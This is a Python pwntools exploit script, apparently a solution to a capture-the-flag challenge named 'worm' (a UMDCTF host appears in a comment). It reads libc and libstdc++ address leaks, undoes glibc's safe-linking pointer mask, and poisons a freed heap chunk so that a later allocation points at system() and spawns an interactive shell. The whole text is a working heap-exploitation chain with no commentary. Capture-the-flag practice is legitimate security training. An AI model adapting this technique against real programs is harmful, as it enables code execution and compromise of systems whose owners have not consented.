from pwn import *

#io = gdb.debug("./worm")
io = remote("localhost", 1447)
#io = remote("challs.umdctf.io", 31818)

io.recvuntil(b"leak: ")

libc = ELF("./libc.so.6")
libc_leak = int(io.recvline(), 16)
libc_base = libc_leak - libc.symbols['_IO_2_1_stdin_']

io.recvuntil(b"leak: ")
libcpp_leak = int(io.recvline(), 16)
libcpp_offset = 14624

system = libc.symbols['system']

print(hex(libc_leak))
print(hex(libc_base))

io.sendline(b'1')
io.sendline(b'/bin/sh')

io.sendline(b'1')
io.sendline(b'/bin/sh')

io.sendline(b'1')
io.sendline(b'/bin/sh')

io.sendline(b'2')
io.sendline(b'0')
io.sendline(b'0')

io.sendline(b'4')
io.sendline(b'0')

io.recvuntil(b"get? ")
current_ptr_masked = u64(io.recvline(keepends=False)+b'\x00\x00')

# unmask
val = current_ptr_masked
mask = 0xfff << 52
while mask:
    v = val & mask
    val ^= (v >> 12)
    mask >>= 12

mask = current_ptr_masked ^ val

io.sendline(b'3')
io.sendline(b'0')
io.sendline(p64((libcpp_leak + libcpp_offset - 16) ^ mask) + b'/bin/sh\x00'*1)

pause()

io.sendline(b'1')
print(p64(libc_base+system))
io.sendline(b'/bin/sh\x00'*2 + p64(libc_base + system))

io.interactive()




